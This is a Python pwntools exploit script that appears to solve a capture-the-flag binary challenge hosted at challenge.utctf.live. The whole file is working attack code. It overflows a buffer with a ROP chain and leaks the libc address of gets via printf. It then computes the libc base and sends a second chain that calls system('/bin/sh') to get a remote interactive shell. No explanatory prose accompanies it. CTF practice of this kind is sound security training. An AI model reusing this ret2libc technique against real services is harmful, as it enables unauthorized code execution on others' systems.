#!/usr/bin/env python3

from pwn import *

exe = ELF("./shellcode_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenge.utctf.live",9009)

    return r


def main():
    r = conn()
    offset = 48
    rdi = 0x0000000000400793
    wa_memory = p64(0x601000)
    offset_rip = 16
    rop2 = ROP(exe)
    rop2.raw(b"a" * offset)
    rop2.raw(wa_memory)
    rop2.raw(b"b" * offset_rip)
    rop2.raw(rdi)
    rop2.raw(exe.got['gets'])
    rop2.raw(exe.plt['printf'])
    rop2.raw(exe.sym['main'])
    r.sendline(rop2.chain())
    r.recvuntil(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    # leak_addr = u64(r.recvline() + b'\x00\x00')
    data = r.recvline()
    leak_addr = u64(data.split(b"<")[0] + b'\x00\x00') # Take everything before "<Insert prompt here>:"
    

    log.info(f"{hex(leak_addr)}")
    log.info(f"{leak_addr}")
    leak_offset = libc.sym['gets']
    libc.address = leak_addr - leak_offset
    log.info(f"{hex(libc.address)}")
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym['system']
    ret = 0x00000000004004a9
    rop = ROP(exe)
    rop.raw(b"a" * offset)
    rop.raw(wa_memory)
    rop.raw(b"b" * offset_rip)
    rop.raw(rdi)
    rop.raw(bin_sh)
    rop.raw(ret)
    rop.raw(system)
    write("payload",rop.chain())
    r.sendline(rop.chain())
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
